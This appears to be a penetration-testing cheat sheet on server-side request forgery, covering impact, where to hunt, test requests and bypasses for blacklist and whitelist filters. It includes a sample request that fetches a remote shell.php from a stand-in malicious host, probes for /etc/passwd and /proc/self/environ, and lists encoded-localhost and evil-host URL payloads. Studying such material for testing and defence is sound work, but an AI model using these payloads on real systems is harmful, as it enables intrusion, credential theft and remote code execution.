## SSRF Attacks 
- SSRF attacks against the server itself
- SSRF attacks against other back-end systems



## Exploiting SSRF vulnerabilities can lead to:
- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution


## When hunting for SSRF vulnerabilities, we should `look for` OR `fuzz`:
- Parts of HTTP requests, including URLs
- File imports such as HTML, PDFs, images, etc.
- Remote server connections to fetch data
- API specification imports
- Dashboards including ping and similar functionalities to check server statuses


## Testing if app vulnerable to SSRF
The most common test is for local and remote file inclusion

- Load the Contents of a File (try RCE)
```
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

- Access a Restricted Page
```
GET https://example.com/page?page=http://localhost/admin

Or:

GET https://example.com/page?page=http://127.0.0.1/admin

```
### methdology 
- try to include local or remote files (http,file,ftp)
- fuzz ports and check functionalities (ex:get dir listing)
- try to get info about the server (ex:/proc/self/environ , /etc/passwd)
- do not forget to url encode if going through more than one app (ex:trible url encode)



## Bypass

### SSRF with blacklist-based input filters

- Using an alternative IP representation for 127.0.0.1
```
127.1.
017700000001 (octal)
0x7f000001 (hexadecimal)
2130706433 (integer)
::ffff:7f00:1  , 0:0:0:0:0:ffff:7f00:0001 , 0000:0000:0000:0000:0000:ffff:7f00:0001(IPv6)

```
- Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
- Obfuscating blocked strings using URL encoding or case variation.
- Providing a URL that you control, which subsequently redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL.
- Nip.io allows simple wildcard DNS for any IP address
```
127.0.0.1.nip.io
127.0.0.1.nip.io
0x7f000001.nip.io (hexadecimal IP notation)
Something.google.com.127.0.0.1.nip.io
```


### SSRF with whitelist-based input filters

- You can embed credentials in a URL before the hostname, using the @ character. For example:
```bash
https://expected-host:fakepassword@evil-host
```
- You can use the # character to indicate a URL fragment. For example:
```bash
https://evil-host#expected-host
```
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```bash
https://expected-host.evil-host
```
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
```text
Note
that you can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
```
- You can use combinations of these techniques together.

